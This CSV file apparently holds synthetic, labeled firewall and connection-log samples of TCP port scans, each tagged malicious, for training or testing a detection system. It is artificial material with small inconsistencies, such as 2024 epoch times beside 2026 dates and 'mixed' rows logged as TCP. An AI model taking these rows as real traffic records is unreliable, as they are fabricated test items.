id,attack_type,protocol,log_example,expected_label
SNORT-P1-0001,port_scan,mixed,"2026-05-25T08:10:12Z FW scan_event src=198.51.100.10 dst=10.0.0.20 proto=TCP spt=40000 dpt=22 flags=SYN note=connection attempts to ports 21,22,80,443 within 7s",malicious
SNORT-P1-0002,port_scan,tcp,"1716800001.12 C001 198.51.100.11 40011 10.0.1.21 80 tcp S0 scan_ports=ports 22,25,110,143 msg=sequential SYN scan",malicious
SNORT-P1-0003,port_scan,tcp,"2026-05-25T08:12:12Z FW scan_event src=198.51.100.12 dst=10.0.2.22 proto=TCP spt=40022 dpt=22 flags=SYN note=connection attempts to ports 53,80,443,8443 within 7s",malicious
SNORT-P1-0004,port_scan,mixed,"1716800003.12 C003 198.51.100.13 40033 10.0.3.23 80 tcp S0 scan_ports=ports 135,139,445,3389 msg=sequential SYN scan",malicious
SNORT-P1-0005,port_scan,tcp,"2026-05-25T08:14:12Z FW scan_event src=198.51.100.14 dst=10.0.0.24 proto=TCP spt=40044 dpt=22 flags=SYN note=connection attempts to ports 161,162,514,2049 within 7s",malicious
SNORT-P1-0006,port_scan,tcp,"1716800005.12 C005 198.51.100.15 40055 10.0.1.25 80 tcp S0 scan_ports=ports 8080,8443,9000,9443 msg=sequential SYN scan",malicious
SNORT-P1-0007,port_scan,mixed,"2026-05-25T08:16:12Z FW scan_event src=198.51.100.16 dst=10.0.2.26 proto=TCP spt=40066 dpt=22 flags=SYN note=connection attempts to ports 3306,5432,6379,9200 within 7s",malicious
SNORT-P1-0008,port_scan,tcp,"1716800007.12 C007 198.51.100.17 40077 10.0.3.27 80 tcp S0 scan_ports=ports 5900,5901,6000,8081 msg=sequential SYN scan",malicious
SNORT-P1-0009,port_scan,tcp,"2026-05-25T08:18:12Z FW scan_event src=198.51.100.18 dst=10.0.0.28 proto=TCP spt=40088 dpt=22 flags=SYN note=connection attempts to ports 23,69,111,515 within 7s",malicious
SNORT-P1-0010,port_scan,mixed,"1716800009.12 C009 198.51.100.19 40099 10.0.1.29 80 tcp S0 scan_ports=ports 88,389,636,3268 msg=sequential SYN scan",malicious
SNORT-P1-0011,port_scan,tcp,"2026-05-25T08:20:12Z FW scan_event src=198.51.100.20 dst=10.0.2.30 proto=TCP spt=40110 dpt=22 flags=SYN note=connection attempts to ports 67,68,123,161 within 7s",malicious
SNORT-P1-0012,port_scan,tcp,"1716800011.12 C011 198.51.100.21 40121 10.0.3.31 80 tcp S0 scan_ports=ports 5000,5060,5061,8088 msg=sequential SYN scan",malicious
